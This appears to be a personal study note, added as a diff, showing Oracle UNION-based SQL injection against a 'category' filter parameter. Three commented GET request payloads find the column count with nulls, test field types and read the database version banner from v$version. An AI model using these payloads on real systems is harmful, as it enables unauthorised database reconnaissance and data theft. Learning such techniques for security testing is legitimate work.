@@ -1,0 +1,13 @@
+
+[ WEB > SQLI > ORACLE > UNION SELECT ]
+
+// Check for sqli and use null params to get param count
+// dual is blank table for focused select (ignore left select)
+GET /filter?category=Pets' union select null, null from dual--
+
+// Confirm field types
+GET /filter?category=Pets' union select 'a', 'b' from dual--
+
+// Get Oracle version...
+GET /filter?category=Pets' union select banner, null from v$version--
+
